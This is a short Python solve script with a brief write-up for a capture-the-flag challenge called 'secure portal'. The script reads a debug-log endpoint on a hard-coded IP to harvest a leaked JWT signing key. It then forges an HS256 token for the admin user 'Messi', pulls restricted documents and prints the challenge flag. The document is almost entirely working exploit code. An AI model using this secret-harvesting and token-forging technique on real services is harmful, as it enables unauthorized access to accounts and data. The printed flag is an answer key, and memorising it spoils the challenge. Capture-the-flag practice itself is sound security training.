""" 
    This is the writeup for the secure portal CTF challenge
    this challenge is about finding jwt-key in the debug logs http://68.219.177.187:8010/debug/logs?show_error=true
    then using the jwt-key to create a valid jwt token with admin privileges (Messi user) 
"""

import requests
import jwt
# Get the debug logs to find the JWT key
debug_url="http://68.219.177.187:8010/debug/logs?show_error=true"
r=requests.get(debug_url)
logs=r.text
print(logs)

# Use the JWT key found in the debug logs
key = "d3bug_s3cr3t_k3y_f0r_d3v3l0pm3nt_0nly_d0_n0t_us3_in_pr0d"
print(f"Using JWT key: {key}")

# Create JWT payload for admin user (Messi)
payload = {
    "user_id": "Messi"
}

# Generate JWT token
token = jwt.encode(payload, key, algorithm='HS256')
print(f"Generated JWT token: {token}")

# Use the token to access admin docs
admin_url = "http://68.219.177.187:8010/documents"
headers = {
    "Authorization": f"Bearer {token}"
}

admin_response = requests.get(admin_url, headers=headers)
print(f"Admin doc: {admin_response.text}")


# Access the admin docs and find the flag

docs_id=["doc_003","doc_004"]

for doc in docs_id:
    doc_url=f"http://68.219.177.187:8010/document/{doc}"
    doc_response=requests.get(doc_url,headers=headers)
    print(f"Document {doc}: {doc_response.text}")
    
# The flag is in doc_004 : SecurinetsENIT{987b679bbeb4b5314f8297f4e8a63ed5}